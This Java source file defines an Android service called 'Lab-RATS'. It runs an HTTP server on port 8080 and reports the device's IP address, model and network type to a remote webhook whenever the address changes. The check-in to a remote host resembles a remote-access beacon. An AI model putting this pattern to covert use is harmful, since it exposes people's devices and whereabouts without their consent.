package com.labs.k4n3co;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Intent;
import android.os.Build;
import android.os.IBinder;
import android.util.Log;

import androidx.annotation.Nullable;
import androidx.core.app.NotificationCompat;

import android.net.ConnectivityManager;
import android.net.LinkProperties;
import android.net.Network;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class HttpServerService extends Service {

    private static final String TAG = "HttpServerService";
    private static final String CHANNEL_ID = "LabRATS-Channel";
    private static final int NOTIFICATION_ID = 1;
    public static boolean isRunning = false;

    // URL is now loaded from local.properties via BuildConfig
    private static final String REMOTE_WEBHOOK_URL = BuildConfig.WEBHOOK_URL;

    private K4N3COHttpServer server;
    private ConnectivityManager connectivityManager;
    private ConnectivityManager.NetworkCallback networkCallback;
    private String lastReportedIp = "";
    private final ExecutorService networkExecutor = Executors.newSingleThreadExecutor();

    @Override
    public void onCreate() {
        super.onCreate();
        createNotificationChannel();
        connectivityManager = (ConnectivityManager) getSystemService(CONNECTIVITY_SERVICE);
        registerNetworkCallback();
        checkAndReportIp(); // Initial check
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        String action = intent != null ? intent.getAction() : null;

        if ("START".equals(action)) {
            startForeground(NOTIFICATION_ID, createNotification());
            startServer();
        } else if ("STOP".equals(action)) {
            // Stop server in a background thread to prevent UI freeze
            new Thread(() -> {
                stopServer();
                stopForeground(true);
                stopSelf();
            }).start();
        }

        return START_NOT_STICKY;
    }

    private void startServer() {
        try {
            if (server == null || !server.isAlive()) {
                server = new K4N3COHttpServer(this, 8080);
                server.start();
                isRunning = true;
                Log.d(TAG, "HTTP Server started on port 8080");
            }
        } catch (Exception e) {
            Log.e(TAG, "Failed to start server", e);
        }
    }

    private void stopServer() {
        try {
            isRunning = false;
            if (server != null) {
                if (server.isAlive()) {
                    server.stop();
                }
                server = null;
                Log.d(TAG, "HTTP Server stopped");
            }
        } catch (Exception e) {
            Log.e(TAG, "Error stopping server", e);
        }
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                    CHANNEL_ID,
                    "Lab-RATS Server",
                    NotificationManager.IMPORTANCE_LOW);
            channel.setDescription("HTTP Server running");

            NotificationManager manager = getSystemService(NotificationManager.class);
            manager.createNotificationChannel(channel);
        }
    }

    private Notification createNotification() {
        Intent notificationIntent = new Intent(this, MainActivity.class);
        PendingIntent pendingIntent = PendingIntent.getActivity(
                this, 0, notificationIntent,
                PendingIntent.FLAG_IMMUTABLE);

        String ip = MainActivity.getLocalIpAddress();
        String formattedIp = (ip != null && ip.contains(":")) ? "[" + ip + "]" : ip;
        String contentText = ip != null
                ? "Server running at http://" + formattedIp + ":8080"
                : "Server running on port 8080";

        return new NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("🛡️ LAB-RATS Active")
                .setContentText(contentText)
                .setSmallIcon(android.R.drawable.ic_dialog_info)
                .setContentIntent(pendingIntent)
                .setOngoing(true)
                .setPriority(NotificationCompat.PRIORITY_LOW)
                .build();
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onDestroy() {
        unregisterNetworkCallback();
        stopServer();
        networkExecutor.shutdownNow();
        super.onDestroy();
    }

    private void registerNetworkCallback() {
        if (connectivityManager != null) {
            try {
                networkCallback = new ConnectivityManager.NetworkCallback() {
                    @Override
                    public void onLinkPropertiesChanged(Network network, LinkProperties linkProperties) {
                        super.onLinkPropertiesChanged(network, linkProperties);
                        checkAndReportIp();
                    }
                };
                connectivityManager.registerDefaultNetworkCallback(networkCallback);
            } catch (Exception e) {
                Log.e(TAG, "Failed to register network callback", e);
            }
        }
    }

    private void unregisterNetworkCallback() {
        if (connectivityManager != null && networkCallback != null) {
            try {
                connectivityManager.unregisterNetworkCallback(networkCallback);
                networkCallback = null;
            } catch (Exception e) {
                Log.e(TAG, "Error unregistering network callback", e);
            }
        }
    }

    private void checkAndReportIp() {
        if (networkExecutor.isShutdown()) return;
        
        // MainActivity.getPublicIPv6Async handles the threading internally,
        // but we want to ensure we don't spam.
        MainActivity.getPublicIPv6Async(publicIp -> {
            if (networkExecutor.isShutdown()) return;
            
            String localIp = MainActivity.getLocalIpAddress();
            String currentIp = (localIp != null) ? localIp : publicIp;

            if (currentIp != null && !currentIp.equals(lastReportedIp)) {
                Log.d(TAG, "IP Changed or Initial Report: " + currentIp);
                if (REMOTE_WEBHOOK_URL != null && !REMOTE_WEBHOOK_URL.isEmpty()) {
                    // Send in background thread as network operations are involved
                    try {
                        networkExecutor.execute(() -> sendIpToWebhook(currentIp));
                    } catch (Exception e) {
                        Log.e(TAG, "Executor error", e);
                    }
                }
                lastReportedIp = currentIp;
            }
        });
    }

    private void sendIpToWebhook(String ip) {
        try {
            URL url = new URL(REMOTE_WEBHOOK_URL);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setDoOutput(true);
            conn.setRequestProperty("Content-Type", "application/json");

            // Send JSON with IP, Port, Device Info, and Link
            String formattedIp = (ip != null && ip.contains(":")) ? "[" + ip + "]" : ip;
            String link = "http://" + formattedIp + ":8080";
            
            // Add extra info to help diagnose connection issues
            String networkType = "Unknown";
            if (connectivityManager != null) {
                android.net.Network activeNetwork = connectivityManager.getActiveNetwork();
                android.net.NetworkCapabilities caps = connectivityManager.getNetworkCapabilities(activeNetwork);
                if (caps != null) {
                    if (caps.hasTransport(android.net.NetworkCapabilities.TRANSPORT_WIFI)) networkType = "WiFi";
                    else if (caps.hasTransport(android.net.NetworkCapabilities.TRANSPORT_CELLULAR)) networkType = "Cellular";
                }
            }

            String jsonInputString = "{\"ip\": \"" + ip + "\", \"port\": 8080, \"device\": \"" + Build.MODEL
                    + "\", \"network\": \"" + networkType + "\", \"link\": \"" + link + "\"}";

            try (OutputStream os = conn.getOutputStream()) {
                byte[] input = jsonInputString.getBytes(StandardCharsets.UTF_8);
                os.write(input, 0, input.length);
            }

            int code = conn.getResponseCode();
            Log.d(TAG, "Report IP Response Code: " + code);

        } catch (Exception e) {
            Log.e(TAG, "Failed to report IP: " + e.getMessage());
        }
    }
}
